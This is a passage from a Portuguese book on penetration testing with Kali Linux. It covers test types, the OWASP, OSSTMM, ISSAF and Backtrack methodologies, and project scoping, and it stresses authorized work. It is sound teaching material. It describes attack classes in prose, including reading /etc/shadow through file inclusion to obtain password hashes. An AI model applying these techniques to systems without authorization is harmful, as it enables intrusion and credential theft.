\tvital\tpara\tgrandes\ncorporações,\tpois\tsomente\tpor\tmeio\tdo\tpentest\té\tque\tserá\tpossível\tdescobrir\tas\nfalhas\tinerentes\tà\trede\ttestada.\tCom\tas\tfalhas\tencontradas,\té\tpossível\tcriar\nmecanismos\tde\tdefesa\tadequados\tpara\taquela\tcorporação.\nHá\tdiversas\tmetodologias\tque\tpodem\tser\tadotadas\tem\tum\tpentest:\tOSSTMM,\nOWASP\te\toutras.\tCada\tmetodologia\tabrange\tpropósitos\tdiversos.\tNeste\tlivro\nserá\tusada\tuma\tmetodologia\tpersonalizada:\ta\tmetodologia\tBacktrack\n1\n.\nA\tmeta\tdo\tpentest\tnão\té\tconseguir\tacesso\tnão\tautorizado\ta\tum\tsistema\tou\nservidor,\tsimplesmente\tpela\tdiversão\tde\trealizar\tum\tataque\tmuito\tsimilar\tao\treal;\né\tsim,\ta\tpartir\tdas\tfalhas\tencontradas,\taplicar\tos\tdevidos\tmecanismos\tde\nsegurança\tpara\taquele\tsistema\tauditado.\tAs\tcorreções\tpoderão\tser\taplicadas\tda\nmelhor\tforma\tpossível,\tseja\treparando\thardwares\tcom\tbugs,\taplicando\tpatchs\tde\nsegurança\te\tpolíticas\tde\tsenhas,\tentre\toutras\tformas.\nSempre\tno\tfinal\tde\tcada\tteste,\tum\trelatório\tcom\tas\tvulnerabilidades\tencontradas\ne\tsoluções\tpara\tessas\tfalhas\tsão\tentregues\tao\tcliente.\nLembrando\tque,\tpor\tmais\tdetalhados\tque\tsejam\tos\ttestes\tde\tintrusão,\tsempre\thá\nvulnerabilidades\tdesconhecidas\tque\tnão\tforam\tdivulgadas,\te,\tmesmo\tem\tum\npentest,\tnão\té\tpossível\tencontrá-las.\tDe\tfato,\to\tintuito\tdeste\tlivro\té\texplorar\nfalhas\tconhecidas\te\tjá\tdivulgadas,\tpara\tas\tquais\t(pelo\tmenos\ta\tmaioria)\tjá\nexistem\tcorreções.\n3.2\tPorque\trealizá-lo?O\tprincipal\tobjetivo\tdo\tteste\tde\tpenetração\té\tdeterminar\tfalhas\te\nvulnerabilidades.\tAs\tinformações\tcolhidas\tdurante\to\tteste\tde\tpenetração\tsão\ninformadas\tno\trelatório\tde\tvulnerabilidades.\nPorém\tum\tteste\tde\tpenetração\ttambém\tpode\tser\trealizado\tpor\tcriminosos\nvirtuais,\tque\tterão\tacesso\ta\tinformações\tconfidenciais\tque\tcomprometem\ta\nintegridade\tdos\tdados\tdigitais\tde\tseu\talvo.\tDe\tposse\tde\ttais\tinformações\nconfidenciais,\ta\trede\tque\té\talvo\tde\tum\tataque\tdigital\tpode\tsofrer\tconsequências\nque\tvão\tdepender\tda\tvontade\tdo\tcriminoso\tvirtual:\n•\tRoubo\te\tdisseminação\tna\tweb\tde\tinformações\tconfidenciais\te\tarquivos\nsigilosos.\n•\tRoubo\te\tsequestro\tde\tsenhas\tde\tacesso\ta\tservidores\te\tmáquinas\tvitais\tao\nfuncionamento\tda\trede.\n•\tRoubo\tde\tsenhas\tde\tinternet\tbanking\n.\n•\tUso\tde\tqualquer\tinformação\tconfidencial\tpara\tbenefício\tpróprio.\n•\tInstalação\tde\tvírus\te\tprogramas\tpara\tacesso\tremoto\t(backdoors).\n•\tUso\tda\trede\te\tdos\tcomputadores\tcomo\t“laranja”\tpara\toutros\tcrimes\tvirtuais.\n•\tPerda\tde\tfaturamento\tfinanceiro\tdevido\ta\tataques\tde\tnegação\te\tparalisação\tde\nserviços\te\tinternet\tna\trede\tvítima.\n•\tDentre\toutras\tconsequências.\nO\tteste\tde\tpenetração\tdeve\tfazer\tparte\tdo\tescopo\tde\tum\tprojeto\tde\tredes,\ttendo\nem\tvista\tque\thaverá\tinúmeras\tmaneiras\tque\to\tatacante\tutilizará\tpara\tobter\tacesso\nà\trede\ttestada.\tUma\tvez\tinvadida,\ta\trede\tpoderá\tsofrer\tsérios\tdanos\te\ta\tequipe\tde\nTI,\tsérias\tperdas.\n3.3\tTipos\tde\tpentest\nDevido\ta\tuma\tgama\tde\ttipos\tde\tpentest\tque\texistem\t(rede\tsem\tfio,\tweb,\naplicativo\tmóvel\tetc.),\tvamos\tclassificar\tantes\tquais\tsão\tos\ttipos\tde\tteste\tque\npodem\tser\trealizados,\tpara\tdepois\tdeterminarmos\ta\tmetodologia\tcorreta\tsobre\to\ntipo\tde\tteste\tescolhido.\n3.3.1\tBlack-box\nO\tcenário\tblack-box\ttambém\té\tchamado\tde\tteste\tda\tcaixa\tpreta\tou\tteste\tcego.Nesse\ttipo\tde\tteste,\to\tauditor\tde\tsegurança\tacessará\ta\tinfraestrutura\tda\trede\tsem\nter\tconhecimento\tprévio\tdo\tfuncionamento\tda\trede,\tcomo\tquais\tsão\tas\tmáquinas,\nqual\té\to\tmapeamento\tda\tinfraestrutura,\tservidores\te\tprocessos\trodando.\nEsse\tcenário\tserá\to\tmais\ttípico\tquando\tuma\tempresa\tsofrer\tum\tataque\tde\ninvasão\texterno,\tpois\ta\tmaioria\tdos\tinvasores\tterá\tvindo\tde\tfora\tda\trede\te\tnão\nterá\tconhecimento\tda\tinfraestrutura.\tOs\taspirantes\ta\thackers\texecutam\tscripts\nautomatizados\tpara\tdeterminar\tfalhas\te\tvulnerabilidades,\te\tsaem\ta\tseu\tbel-prazer\nenumerando\tas\tredes\tque\tencontram.\tPor\tuma\tquestão\tde\tsorte,\tacabam\nencontrando\tuma\trede\tfalha\te\tmal\tconfigurada\tque\tpermite\ta\tsua\tinvasão.\nUm\texemplo\tclássico\tde\tcenário\tde\tblack-box\té\tquando\tum\tscript\tkid\tencontra\num\tsite\tna\tinternet\tque\tsofre\tde\talgum\tbug\tconhecido,\tcomo\tSQL\tInjection,\te\npor\tmeio\tde\tum\tprograma\tespecial\tconsegue\tacesso\tao\tpainel\tadministrativo\tdo\nsite.\nA\tmetodologia\tblack-box\té\tsubcategorizada\tem:\n•\t\nBlind\n\t–\tNeste\tteste\to\tauditor\tnão\ttem\tnenhuma\tinformação\tda\trede\ta\tser\ntestada,\te\to\talvo\tsabe\to\tque\tserá\tatacado\te\tquais\ttestes\te\tmetodologias\tserão\nrealizados.\n•\t\nDouble\tBlind\n\t–\tNeste\tteste\to\tauditor\tnão\ttem\tnenhuma\tinformação\tda\trede\ta\nser\ttestada,\te\to\talvo\tnão\tsabe\to\tque\tserá\tatacado\te\tnem\tquais\tmetodologias\te\nataques\tserão\trealizados.\nEsse\tteste\té\tmais\tsimples\tdo\tque\to\twhite-box,\tpois\tapenas\tdificultará\tos\ninvasores\texternos\tque\tnão\ttêm\tconhecimento\tda\trede.\tPorém,\tem\tum\tcenário\nem\tque\to\tatacante\ttem\tconhecimento\tda\trede\t(ou\taté\tmesmo\tacesso\trestrito\tà\nrede),\ta\tmetodologia\tblack-box\ttorna-se\tsuperficial.\tOutro\tcenário\tseria\tquando\nse\trealiza\to\tteste\tblack-box,\tmas\tisso\tnão\tgarante\tem\tnada\ta\tsegurança\tinterna\tda\nrede,\te\tela\tainda\tpoderá\trodar\tprocessos\te\tserviços\tvulneráveis\tacessíveis\ta\npessoas\tde\tdentro\tda\tcorporação\t(por\texemplo,\tfuncionários).\tNesses\tcasos,\to\nmelhor\ta\tfazer\té\tadotar\ta\tmetodologia\twhite-box.\n3.3.2\tWhite-box\nO\tcenário\twhite-box\ttambém\té\tchamado\tde\tteste\tda\tcaixa\tbranca\tou\tteste\tnão\ncego.\tNesse\tteste,\to\tauditor\tde\tsegurança\tterá\ttotal\tconhecimento\tda\ninfraestrutura\tda\trede\ttestada:\tdiagrama\te\tmapeamento\tda\trede,\tendereços\tIP\nusados,\tfirewalls,\tcódigo-fonte\tdas\taplicações\tetc.Esse\tcenário\ttorna-se\ttípico\tem\tcasos\tde\tataques\tinternos.\tPor\texemplo:\tum\nfuncionário\tde\talto\tcargo\tque\tdeseja\tprejudicar\ta\tempresa\tou\tlucrar\tà\tcusta\tdela\nou\tum\tex-funcionário\tinsatisfeito\tque\ttinha\tacesso\ta\tinformações\tsigilosas\te\nagora\tquer\tvingança.\tOutro\texemplo\tseria\tum\tsistema\tweb\tque\tsolicite\tusuário\te\nsenha.\tDessa\tforma,\to\tauditor\tvai\tnecessitar\tde\tum\tusuário\te\tuma\tsenha\tcriados\nespecialmente\tpara\ta\tauditoria.\tUm\tterceiro\texemplo\tseria\ta\trevisão\tdo\tcódigo-\nfonte,\tem\tque\tobrigatoriamente\to\tauditor\tterá\tde\tler\to\tcódigo\tda\taplicação\tpara\nbuscar\tas\tvulnerabilidades.\nA\tmetodologia\twhite-box\té\tsubcategorizada\tem:\n•\t\nTandem\n\t–\tNeste\tteste\to\tauditor\ttem\ttotal\tconhecimento\tda\trede\ta\tser\ttestada.\nO\talvo\tsabe\to\tque\tserá\tatacado\te\tquais\ttestes\tserão\trealizados.\tEssa\nmetodologia\ttambém\té\tapelidada\tde\tcaixa\tde\tcristal.\n•\t\nReversal\n\t–\tNeste\tteste\to\tauditor\ttem\ttotal\tconhecimento\tda\trede\ta\tser\ttestada.\nO\talvo\tnão\tsabe\tque\tserá\tatacado,\tnem\tquais\ttestes\tserão\trealizados.\nA\tmetodologia\twhite-box\té\tmais\tespecífica\te\tdetalhada\tdo\tque\ta\tblack-box,\tvisto\nque\to\tauditor\tterá\tacesso\ta\ttoda\te\tqualquer\tinformação\tda\trede.\tDessa\tforma,\npoderá\telaborar\tum\tplano\tde\tataque\tde\tmaneira\tmuito\tmais\tdetalhada\te\tefetiva.\nAs\tinformações\tcolhidas\tem\ttestes\twhite-box\tpodem\tser\tobtidas\tem\ttestes\tblack-\nbox,\tporém\tpode\tser\tque\talgum\tdetalhe\tpasse\tdespercebido\tpelo\tauditor\tna\nmetodologia\tblack-box.\tPor\texemplo,\tcaso\tseja\tnecessário\trealizar\ta\tenumeração\nDNS\te\ta\trede\tnão\tpermita\ttransferência\tde\tzona,\tdurante\ta\tmetodologia\tblack-\nbox,\tpode\tser\tque\talguns\tservidores\te\tdomínios\tnão\tsejam\trecuperados\tpelo\nauditor,\to\tque\tnão\taconteceria\tdurante\ta\tmetodologia\twhite-box.\nObviamente,\tem\ttestes\twhite-box,\to\ttempo\te\to\tcusto\tsão\tbem\tmaiores\tdo\tque\tem\ntestes\tblack-box,\tmas\tgarantem\tum\tresultado\tbem\tmais\tefetivo.\n3.3.3\tGray-box\nGray-box\ttambém\té\tchamado\tde\tteste\tda\tcaixa\tcinza\tou\tteste\tparcialmente\tcego.\nNesse\tteste,\to\tauditor\tterá\tconhecimento\tparcial\tda\trede\ttestada.\tÉ\tuma\tmescla\nentre\tos\ttestes\tblack-box\te\twhite-box.\nUm\texemplo\tdesse\tcenário\té\tum\tsistema\tweb\tem\tque\to\tauditor\tterá\tacesso\nparcial\tàs\tinformações\t(tem\tacesso\ta\tum\tusuário\te\tuma\tsenha,\tporém\tnão\ttem\nacesso\tao\tcódigo-fonte).A\tmetodologia\tgray-box\té\tsubcategorizada\tem:\n•\t\nGray-box\n\t–\tNeste\tteste\to\tauditor\ttem\tconhecimento\tparcial\tdo\tsistema,\te\to\nalvo\tsabe\to\tque\tserá\tatacado\te\tquais\ttestes\tserão\trealizados.\n•\t\nDouble\tgray-box\n\t–\tNeste\tteste\to\tauditor\ttem\tconhecimento\tparcial\tdo\nsistema,\te\to\talvo\tnão\tsabe\to\tque\tserá\tatacado\te\tnem\tquais\ttestes\tserão\nrealizados.\n3.4\tAnálise\tde\tvulnerabilidade\nProcesso\tque\tconsiste\tem\tapenas\tenumerar\tas\tvulnerabilidades\tencontradas.\tA\ndiferença\tentre\tanálise\tde\tvulnerabilidade\te\to\tteste\tde\tpenetração\té\tque\teste\tvai\nalém\tda\tidentificação\tdas\tvulnerabilidades\te\tentra\tem\tetapas\tcomo\texploração\ndo\talvo,\tganho\tde\tacesso\tadministrativo\tno\tsistema,\tinstalação\tde\tprogramas\npara\tcontrole\tremoto\tetc.\tJá\tna\tanálise\tde\tvulnerabilidade,\té\tfeito\tapenas\tum\nlevantamento\tdas\tfalhas\tencontradas\tsem\tusar\to\tverdadeiro\t“poder\tde\tfogo”\tde\num\tteste\tde\tintrusão,\tnão\trelatando\tse\trealmente\ta\tvulnerabilidade\texiste\tou\tnão.\nPara\tilustrar\ta\tdiferença\tentre\tpentest\te\tanálise\tde\tvulnerabilidade:\tem\tum\npentest\tfoi\tdetectado\tque\tuma\tpágina\tsofre\tde\tuma\tvulnerabilidade\tde\tSQL\nInjection.\tPara\tse\tcertificar\tde\tque\ta\tpágina\tapresenta\tessa\tvulnerabilidade,\tno\npentest\tdeverão\tser\tfeitos\ttestes\te\ttentar\texplorar\tde\tfato\tessa\tvulnerabilidade\tpor\nmeio\tde\tinjeções\tde\tcódigos\te\tuso\tde\texploits.\tCom\tisso\tconseguimos\ndeterminar\tse\ta\tvulnerabilidade\tde\tfato\texiste\te\tpode\tou\tnão\tser\texplorada\t(nós\neliminamos\tresultados\tfalso-positivos).\tJá\tem\tum\tcenário\tde\tanálise\tde\nvulnerabilidades,\ta\tfalha\tde\tSQL\tInjection\ttambém\té\tdetectada,\tmas\tnão\tsão\nutilizados\texploits\te/ou\tqualquer\toutro\ttipo\tde\tteste\tmais\tintrusivo\tpara\tganho\tde\nacesso.\tDessa\tforma,\ta\tvulnerabilidade\tfoi\tdetectada\tmas\tnão\ttemos\ta\ttotal\ncerteza\tse\tela\té\texplorável\tou\tse\té\tapenas\tum\tresultado\tfalso-positivo.\nMesmo\tcom\ta\tincerteza\tde\tresultados\tfalso-positivos,\ta\tanálise\tde\nvulnerabilidade\té\trecomendada\tem\tcenários\tespeciais\te\trestritivos.\tUma\testação\nde\tmetrô\tcom\ta\tcentral\tsendo\tcontrolada\tpor\tdispositivos\tsem\tfio\té\tum\texemplo\npara\ta\trealização\tde\tanálise\tde\tvulnerabilidades.\tIsso\tporque\tse\tfor\trealizado\tum\npentest,\tpoderão\tser\tfeitos\ttestes\tmais\tintrusivos\t(como\tataques\tde\tnegação\tde\nserviço)\tque\tpodem\tgerar\tmuita\tinstabilidade\tno\tsistema\talvo\t(o\tque\tnão\té\npermitido).3.5\tMetodologias\tde\tpentest\nHá\tvários\ttipos\tde\tmetodologias\tque\tpodem\tser\taplicadas\tem\tum\tteste\tde\npenetração.\tA\tnecessidade\tde\tdiversas\tmetodologias\tpara\to\tteste\tde\tpenetração\té\npara\tque,\ta\tcada\tcenário\te\tescopo\tde\tprojeto,\tpossam\tser\tdefinidos\tos\ttestes\ncorretos.\tPor\texemplo,\tnão\thá\tsentido\tem\tutilizar\ta\tOWASP\tem\tredes\tsem\tfio\tou\nmesmo\ta\tOSSTMM\tem\tservidores\tweb.\nAlgumas\tmetodologias\tusadas\tsão\n2\n:\n•\tOSSTMM\t(Open\tSource\tSecurity\tTesting\tMethodology\tManual).\n•\tISSAF\t(Information\tSystems\tSecurity\tAssessment\tFramework).\n•\tOWASP\t(Open\tWeb\tApplication\tSecurity\tProject\tTop\tTen).\n•\tWASC-TC\t(Web\tApplication\tSecurityConsortium\tThreat\tClassification).\nAs\tduas\tprimeiras\tmetodologias\tgarantem\ta\tsegurança\tda\tinformação\tde\tmodo\ngeral.\tJá\tas\tduas\túltimas\tsão\tmetodologias\tespecíficas\tpara\tservidores\tweb.\tA\nescolha\tde\tqual\tmetodologia\taplicar\tdurante\tum\tteste\tde\tpenetração\tdependerá\nde\tvários\tfatores:\to\tque\tfoi\tdefinido\tno\tescopo\tdo\tprojeto,\tquais\tas\tmáquinas\tque\nserão\ttestadas,\tqual\to\tobjetivo\tdo\tteste\tetc.\nNo\tlivro,\tserá\tabordada\ta\tmetodologia\tBacktrack\t–\tadotada\tpor\tShakeel\tAli\te\nTedi\tHeriyanto,\tautores\tdo\tlivro\t\nBacktrack\t4:\tAssuring\tSecurity\tby\tPenetration\nTesting\n,\tque,\taliás,\té\tuma\tleitura\tótima\te\taltamente\trecomendada\tao\tleitor.\n3.5.1\tMetodologia\tISSAF\nA\tmetodologia\tISSAF\tbusca\to\tresultado\tde\tuma\tauditoria\tda\tforma\tmais\trápida\npossível,\tpodendo\tser\tdividida\tem\tquatro\tfases:\n•\t\nPlanejamento\n\t–\tParte\tinicial\tdo\tprojeto\tem\tque\tsão\tdefinidas\tinformações\nsobre\tquais\tmáquinas\tserão\ttestadas,\tqual\to\tpropósito\tdo\tteste\tde\tintrusão\tetc.\nDe\tposse\tdessas\tinformações,\ta\tescolha\tde\tum\tplano\tde\tataque\té\tfeita.\n•\t\nAvaliação\n\t–\tRealização\tdo\tpentest\te\tanotação\tdos\tresultados\tobtidos.\n•\t\nTratamento\n\t–\tDecisão\ta\trespeito\tdas\tvulnerabilidades\tencontradas.\n•\t\nAcreditação\n\t–\tÚltima\tetapa.\tProcedimentos\tfinais\tpara\ta\tempresa\treceber\ta\ncertificação\tISSAF.3.5.2\tMetodologia\tOWASP\nA\tmetodologia\tOWASP\té\tdirecionada\tpara\ttestes\tem\tservidores\te\taplicações\nweb.\tA\tOWASP\tmantém\tuma\tlista\tdas\tprincipais\tvulnerabilidades\tpara\tweb.\nAlguns\ttestes\tque\tsão\trealizados\tem\tambiente\tweb:\n•\t\nInjeção\n\t–\tDiversos\tmétodos\tde\tinjeção\tde\tcódigos\tcom\to\tintuito\tde\tretornar\ndados\tprivativos\t(como\ta\tsenha\tdo\tadministrador\tdo\tsite),\tinjetar\nremotamente\tcomandos\tno\tsistema\tetc.\tAs\tprincipais\tformas\tde\tinjeção\tsão:\n•\t\nInjeção\tSQL\n\t–\tInjeção\tde\tcódigos\tSQL\tcom\to\tintuito\tde\tretornar\tconsultas\nSQL\t(uma\tconsulta\tSQL\tpode\tretornar\tcredenciais\tdo\tsite).\n•\t\nLocal\tFile\tInclusion\n\t–\tInjeção\tde\tarquivos\tlocais\tna\tpágina.\tPor\texemplo,\npode-se\tinjetar\to\tconteúdo\tdo\tarquivo\t\n/etc/shadow\n\tna\tpágina\tcom\to\tintuito\nde\tdescobrir\to\thash\tde\tsenhas\tdos\tusuários.\n•\t\nRemote\tFile\tInclusion\n\t–\tIdem\tà\ttécnica\t\nLocal\tFile\tInclusion\n,\tcom\ta\ndiferença\tde\tque\té\tpossível\tinjetar\tarquivos\tremotos\t(além\tde\tlocais)\tna\npágina.\tUm\tprograma\tmalicioso\tpode\tser\tinserido\tutilizando-se\tdessa\ntécnica.\n•\t\nCode\tInjection\n\t–\tInjeção\tde\tcódigos\tarbitrários\tna\tpágina.\tUm\testouro\tde\npilha\tcom\tacesso\tao\tsistema\tpode\tser\trealizado.\n•\t\nCommand\tInjection\n\t–\tInjeção\tde\tcomandos\tna\tpágina.\tQualquer\tcomando\ndo\tsistema\t(\nls\n,\t\npwd\n,\t\ntouch\n)\tpode\tser\tutilizado.\n•\t\nXSS\n\t–\tInjeção\tde\tcódigos\tJavaScript.\tUm\tcódigo\tJavaScript\tpode\tretornar\ncredenciais\tdo\tsite.\n•\t\nQuebra\tdo\tsistema\tde\tautenticação/sessão\n\t–\tManipulação\te\tquebra\tde\nsistemas\tde\tautenticações,\tcomo\ttela\tde\tlogins.\n•\t\nReferência\tdireta\ta\tobjetos\n\t–\tManipulação\tde\tdados\tdiretamente\tna\tpágina,\npermitindo\tataques\tde\tinjeção\tou\tacesso\ta\táreas\trestritas.\n•\t\nDirectory\tTraversal\n\t–\tCapacidade\tde\tleitura\te\tacesso\ta\tdiretórios\te\tarquivos\nproibidos.\n•\t\nFile\tUpload\n\t–\tEnvio\tde\tarquivos\tpara\to\tservidor\tweb.\tPode\tser\tenviado\tum\narquivo\tmalicioso\tque\tpermita\to\tcontrole\tda\tpágina\tweb.\n•\t\nConfigurações\tfalhas\n\t–\tTeste\tde\tintrusão\tem\tserviços\te\tnão\tsomente\tem\naplicações\tweb.•\t\nExposição\tde\tdados\tsensíveis\n\t–\tDados\tsensíveis\t(como\tnome\tde\tusuário\te\nsenhas)\tsem\tsistemas\tde\tproteção\tou\tmétodos\tcriptográficos\tadequados.\n•\t\nCSRF\n\t–\tFalhas\tem\tsistemas\tde\tautenticação\tque\tpermitem\tações\tnão\nautorizadas\t(como\tcadastrar\tum\tusuário\tno\tsistema,\ttrocar\ta\tsenha\tdo\nadministrador\tdo\tsite\tetc.).\n•\t\nControle\tde\tacesso\tquanto\tà\tfunção\n\t–\tAcesso\ta\tpáginas\trestritas\tsem\nsistemas\tde\tautenticações.\n•\t\nUtilização\tde\tcomponentes\tvulneráveis\n\t–\tUso\tde\tmódulos\te\tframeworks\nconhecidamente\tvulneráveis,\tcomo\to\tJoomla\te\to\tWordPress,\tsem\to\tdevido\nhardening\te\tsua\tcorreta\timplementação.\n•\t\nManutenção\tdo\tacesso\n\t–\tInstalação\tde\tpáginas\tmaliciosas\tno\tservidor\tpara\nposterior\tacesso.\n•\t\nNegação\tde\tserviço\n\t–\tTestes\tde\tstress\tcom\to\tobjetivo\tde\tsobrecarregar\to\talvo\ncom\texcesso\tde\tdados.\nMais\tdetalhes\tsobre\to\tOWASP\tpodem\tser\tencontrados\tem\t\nhttp://owasp.org\n.\n3.5.3\tMetodologia\tOSSTMM\nA\tmetodologia\tOSSTMM\tbaseia-se\tem\tmétodos\tcientíficos\tpara\tauxiliar\tno\nprocesso\tde\tsegurança\tda\tinformação.\tNão\testá\tvinculada\ta\talgum\tteste\nespecífico,\tcomo\tpentest\tou\tanálise\tde\tvulnerabilidade.\tO\tseu\tobjetivo\té\tavaliar\ta\nsegurança\tdigital\tconsiderando\to\tobjetivo\tdo\tnegócio.\tDe\tforma\tgeral,\tpara\tque\nisso\tocorra,\tum\tteste\tde\tsegurança\tseguindo\tos\tpadrões\tOSSTMM\tdeverá\tpassar\npor\ttrês\tfases\n3\n:\tPré-teste,\tteste\te\tpós-teste.\n•\t\nPré-teste\n\t–\tAspectos\tiniciais\tpara\ta\tavaliação\tde\tsegurança:\n•\t\nConformidade\n\t–\tA\tavaliação\tdeve\tseguir\tas\tleis\tvigentes\tde\tdeterminado\npaís,\tnormas\tindustriais\te\tpolíticas\tda\tempresa\tauditada.\n•\t\nRegras\tde\tboa\tconduta\n\t–\tRegras\tgerais\tde\tboa\tconduta\tpara\trealizar\ta\navaliação\tde\tsegurança.\tInclui\tfatores\tcomo\tregras\tde\tMarketing\te\tvenda\n(como\tnão\tusar\to\tmedo\tpara\tvender\tavaliações\tde\tsegurança),\tcontratos\npermissivos\ta\trespeito\tda\tfutura\tavaliação,\ttempo\te\testimativa\tdo\tprojeto,\nescopo,\tpessoas\tenvolvidas\tetc\n•\t\nDetectar\triscos\te\tameaças\n\t–\tTudo\to\tque\tpode\tcomprometer\ta\tsegurança\ndos\tdados\tou\tter\tefeito\tnegativo\tsobre\ta\tcorporação\tauditada.•\t\nTeste\n\t–\tOs\ttestes\tdevem\tser\tdevidamente\trealizados.\tA\tmetodologia\nBacktrack\tdescreve\talguns\tdesses\ttestes.\tTestados\ttodos\tos\tfatores\tde\trisco\tà\norganização,\ta\tdevida\tmetodologia\tcom\to\ttipo\tde\tteste\t(black-box,\twhite-box\nou\tgray-box)\tdeve\tser\tescolhida.\n•\t\nPós-teste\n\t–\tEscrita\te\tapresentação\tdos\tresultados\tobtidos\tem\tum\trelatório\nfinal.\n3.5.4\tMetodologia\tBacktrack\nO\tKali\tLinux\tapresenta\tferramentas\tenquadradas\tde\tacordo\tcom\to\tseu\tobjetivo\n(elas\tsão\tdescritas\tno\tcapítulo\t1.2,“Conhecendo\to\tKali\tLinux”).\tEssas\nferramentas\tacabam\tsendo\tuma\tmescla\tentre\tos\ttestes\tblack-box,\te\twhite-box,\nportanto\tsaber\toperar\tnas\tcategorias\tdo\tKali\tLinux\tajudará\to\tleitor\ta\tmontar\ta\nsua\tmetodologia\tde\tacordo\tcom\to\tescopo\tdo\tprojeto\tdo\tpentest.\nA\tmetodologia\tadotada\tpor\tShakeel\tAli\te\tTedi\tHeriyanto\té\textremamente\ninteressante,\tpois\to\tleitor\tpode\tajustar\ta\tmetodologia\tde\tacordo\tcom\to\tque\té\ndefinido\tno\tescopo.\nA\tmetodologia\tBacktrack,\tque\tserá\texplicada\tno\tdecorrer\tdo\tlivro,\té\tdividida\nem\n4\n:\n1.\n\tPlanejamento\tdo\tprojeto.\n2.\n\tFootprinting.\n3.\n\tFingerprinting.\n4.\n\tEnumeração.\n5.\n\tMapeamento\tde\tvulnerabilidades.\n6.\n\tExploração\tdo\talvo.\n7.\n\tEngenharia\tsocial\t(opcional).\n8.\n\tEscalonamento\tde\tprivilégios.\n9.\n\tManutenção\tdo\tacesso.\n10.\n\tDoS\t–\tNegação\tde\tserviço.\n11.\n\tDocumentação\ttécnica.\n12.\t\nRedes\tsem\tfio\t(opcional).\nA\tetapa\tde\tteste\tde\tintrusão\tweb\t(etapas\t5\te\t6\t–\tmapeamento\te\texploração\tdoalvo)\tdo\t\nBacktrack\t4:\tAssuring\tSecurity\tby\tPenetration\tTesting\n\tnão\té\tabordada\nneste\tlivro,\tpois\tconsidero\tque\tataques\tvoltados\ta\taplicações\tweb\tsão\tum\tassunto\na\tser\ttratado\tem\tobras\tà\tparte.\n1\n\t\nPara\tmais\tinformações\tsobre\t\na\tmetodologia\tBacktrack,\t\nconsulte\to\tt\nópico\t3.5.4\tMetodologia\tBacktrack.\n2\n\tOrdenação\tproposta\tpor\tShakeel\tAli\te\tTedi\tHeriyanto\t(p.\t41).\n3\n\tBaseado\tno\tartigo\t\nhttp://www.edilms.eti.br/uploads/file/publicacoes/artigo_osstmm.pdf\n.\n4\n\tMetodologia\toriginalmente\tproposta\tpor\tShakeel\tAli\te\tTedi\tHeriyanto\tno\tlivro\t\nBacktrack\t4:\t\nAssuring\nSecurity\tby\tPenetration\tTesting\n,\tcom\tpequenas\talterações\tintroduzidas\tpor\tmim.\tUma\tfigura\toriginal\tda\nmetodologia\tBacktrack\tencontra-se\tna\tpágina\t52\tda\tobra.CAPÍTULO\n\t4\nPlanejamento\tdo\tprojeto\nDurante\to\tplanejamento\tde\tum\tprojeto\t(escopo)\tpara\ttestes\tde\tintrusão\tserá\ndecidido\to\tque\tserá\ttestado,\tquais\tas\tcondições\te\tas\tlimitações\tque\tserão\naplicadas\tantes\te\tno\tdecorrer\tdo\tteste\t(por\texemplo:\tse\to\tsistema\ttestado\tfor\npuramente\tsem\tfio,\to\tauditor\tnecessitará\testar\tna\tcobertura\tda\trede\tsem\tfio\tpara\nrealizar\tos\ttestes,\tsendo\tnecessário\tdeslocamento\tfísico\taté\ta\tárea\tpara\to\tpentest),\nquanto\ttempo\tvai\tdemorar\to\tteste\tde\tpenetração,\tqual\to\tobjetivo\tdo\tteste,\tdentre\noutras\tpossibilidades\tque\tdevem\tfazer\tparte\tdo\tescopo.\nHá\tdiversas\tinformações\tque\tum\tescopo\tpode\tconter,\tsendo\tas\tprincipais\tdelas\n1\n:\n•\tInformações\tgerais.\n•\tObjetivo\tdo\tpentest.\n•\tLimitações.\n•\tContrato\tde\tacordo.\n•\tLinha\tdo\ttempo.\n4.1\tInformações\tgerais\nInformações\tgerais\té\ta\tprimeira\tetapa\tdo\tprocesso\tdo\tpentest\te\tconsiste\tem\ncoletar\ttodas\tas\tinformações\ta\trespeito\tda\tinfraestrutura\te\tdo\tque\tserá\ttestado,\ta\nfim\tde\tmontar\tum\tplano\tde\tataque\tmais\tconsistente\te\tdetalhado.\nComo\texemplos\tde\tinformações\tgerais\tpodemos\tcitar:\tquais\trecursos\tserão\ntestados\t(servidores,\tweb,\testações\tcliente,\troteadores\tsem\tfio),\tquais\ttipos\tde\ntestes\te\tmetodologias\tserão\tutilizadas\t(OSSTMM,\tOWASP),\tem\tqual\thorário\npoderá\tser\trealizado\to\tteste\t(caso\texista\talguma\tlimitação\tdesse\ttipo)\tetc.\nFaça\to\tmáximo\tde\tperguntas\tque\tpuder\tpara\tobter\to\tmáximo\tde\tinformações.\n4.2\tObjetivo\tdo\tpentest\nIndependentemente\tdo\tfator\tque\tlevou\to\tcliente\tà\trealização\tdo\tpentest\t(porexemplo,\to\tseu\tcliente\ttem\tuma\trede\tpuramente\tsem\tfio,\tsuspeita\tque\tvizinhos\nao\tredor\tconseguiram\tquebrar\ta\tsenha\tdessa\trede\te\tquer\tque\tvocê\trealize\tuma\nbateria\tde\ttestes\tpara\tverificar\tse\té\tpossível\tou\tnão\tuma\tintrusão),\ttenha\tem\nmente\tque\tum\tpentest\tdeverá\tsempre:\n•\tListar\tas\tameaças\te\tas\tvulnerabilidades\tencontradas\tna\trede.\n•\tManter\tos\tprincípios\tda\tsegurança\tda\tinformação:\tconfidencialidade,\nintegridade,\tdisponibilidade\te\tautenticidade\tdos\tdados.\n•\tConsiderar\ta\tnecessidade\tdo\tseu\tcliente.\tPor\texemplo:\tum\tteste\tsobre\trede\nsem\tfio\tnão\tdeve\tincluir\ttestes\tsobre\tservidores\tweb.\tOu\tse\to\tcliente\tpediu\nsomente\tum\tteste\tde\tnegação\tde\tserviço\tsobre\to\tseu\twebsite,\ttestes\tde\tinjeção\n(SQL\tInjection,\tXSS)\testão\ttotalmente\tfora\tdo\tacordo\te\tnão\tdevem\tser\nrealizados\t(satisfaça\texatamente\to\tdesejo\te\ta\tnecessidade\tde\tseu\tcliente).\n4.3\tLimitações\nAs\tprincipais\tlimitações\tque\tpodem\tocorrer\te\tdevem\tser\tlistadas\tno\tescopo\tsão:\n•\t\nLimitações\tde\tconhecimento\n\t–\tO\tauditor\tnão\ttem\tconhecimento\tsuficiente\nsobre\ta\ttecnologia\ttestada\te\tfaz\tapenas\tuma\tanálise\tsuperficial,\tgerando\nresultados\tinconsistentes\tou\tinsatisfatórios.\n•\t\nLimitações\tfísicas\n\t–\tCaso\ta\trede\ta\tser\ttestada\tseja\texclusivamente\tsem\tfio,\to\nauditor\tnecessita\tlocomover-se\tfisicamente